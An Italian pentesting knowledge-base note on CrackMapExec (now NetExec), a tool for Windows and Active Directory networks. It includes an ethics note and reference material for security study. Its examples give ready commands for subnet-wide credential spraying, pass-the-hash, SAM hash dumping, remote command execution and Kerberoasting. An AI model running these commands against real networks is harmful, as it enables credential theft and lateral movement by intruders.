---
tipo: entita
tag: [windows, tool, ad]
fase: 2
fonti: 4
aggiornato: 2026-06-20
stato: maturo
aliases: ["CrackMapExec"]

---

# CrackMapExec

> Nota etica: CrackMapExec è un tool offensivo potente. Usare solo su reti proprie o con autorizzazione scritta esplicita. L'uso non autorizzato è illegale.

## Cos'è

CrackMapExec (CME, ora rinominato **NetExec** - `nxc`) è un framework di post-exploitation e auditing di sicurezza per reti Windows e [[Active Directory]]. Permette di testare credenziali su larga scala, enumerare risorse, eseguire comandi da remoto e raccogliere informazioni di dominio, tutto tramite protocolli come [[SMB]], [[RDP]], WinRM, LDAP e MSSQL.

## Uso tipico

```bash
# Testare credenziali su tutta una subnet via SMB
crackmapexec smb 192.168.1.0/24 -u Administrator -p 'Password123'

# Pass-the-Hash su tutta la subnet
crackmapexec smb 192.168.1.0/24 -u Administrator -H aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Enumerare share
crackmapexec smb 192.168.1.10 -u utente -p password --shares

# Estrarre hash SAM (richiede privilegi admin locali)
crackmapexec smb 192.168.1.10 -u Administrator -p password --sam

# Eseguire un comando PowerShell da remoto
crackmapexec smb 192.168.1.10 -u Administrator -p password -x 'whoami'

# Usare WinRM (esecuzione comandi remoti)
crackmapexec winrm 192.168.1.10 -u utente -p password -x 'ipconfig'

# Kerberoasting via LDAP
crackmapexec ldap 192.168.1.1 -u utente -p password --kerberoasting output.txt
```

Output chiave: `[+]` = autenticazione riuscita, `(Pwn3d!)` = l'utente ha privilegi di admin locale.

## Quando si usa

CrackMapExec si usa nelle fasi di:
- **Enumerazione**: scoprire quali macchine accettano le credenziali trovate
- **Movimento laterale**: [[Pass-the-Hash]] su scope di rete, trovare quale macchina l'utente amministra
- **Post-exploitation**: dump di hash SAM, LSA secrets, sessioni attive, utenti loggati
- **Auditing AD**: [[Kerberoasting]], [[AS-REP Roasting]], enumerazione utenti/gruppi/policy

## Note e trucchi

- Dal 2024 il progetto è stato rinominato **NetExec** (`nxc`): sintassi identica, sviluppo attivo. CME è deprecato ma ancora largamente documentato.
- Installazione moderna: `pip install netexec` oppure `sudo apt install netexec` (Kali).
- Il flag `--local-auth` forza l'autenticazione locale (non di dominio): utile per testare account locali come Administrator.
- Combinare con [[Impacket]] per exploit più avanzati dopo aver identificato i target con CME.
- Il database locale CME (`~/.cme/`) memorizza automaticamente le credenziali valide trovate.

## Collegamenti

- [[SMB]]
- [[RDP]]
- [[Pass-the-Hash]]
- [[Kerberoasting]]
- [[AS-REP Roasting]]
- [[Impacket]]
- [[Active Directory]]
- [[enum4linux]]

## Fonti

- GitHub — NetExec (successore di CrackMapExec): https://github.com/Pennyw0rth/NetExec
- HackTricks — CrackMapExec: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/crackmapexec
- MITRE ATT&CK T1078 — Valid Accounts: https://attack.mitre.org/techniques/T1078/
- TryHackMe — Active Directory Basics: https://tryhackme.com/room/activedirectorybasics
